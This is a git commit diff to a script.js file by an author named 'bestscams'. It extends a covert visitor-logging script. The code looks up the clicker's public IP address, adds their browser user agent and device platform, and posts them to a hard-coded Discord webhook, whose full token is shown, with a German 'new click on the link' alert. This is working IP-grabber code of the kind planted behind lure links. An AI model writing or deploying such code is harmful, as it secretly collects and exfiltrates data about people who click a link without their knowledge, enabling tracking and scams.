493d845676f068fafa8444f4cd64cd87114ad74f
bestscams <bestscamsholder@gmail.com>
2025-07-15 12:32:28 +0200

    Update script.js

--- script.js
+++ script.js
@@ -4,9 +4,10 @@ fetch("https://api.ipify.org?format=json")
   .then(data => {
     const ip = data.ip;
     const webhookUrl = "https://discord.com/api/webhooks/1394554954391355492/comU-mif2egSzF70Vx8BIyBr0yH4y2MuUOjbSKYql6As7GIu9kTxiIkZwv0xeJMOA1jI";
-    
+    const browser = navigator.userAgent
+    const platform = navigator.platform
     const payload = {
-      content: `📨 Neuen Klick auf den Link bemerkt: ${ip}`
+      content: `📨 Neuen Klick auf den Link bemerkt!\nIP-Addresse: \`${ip}\`\nBrowsertyp: ${browser}\nGerätetyp: ${platform}`
     };
 
     fetch(webhookUrl, {
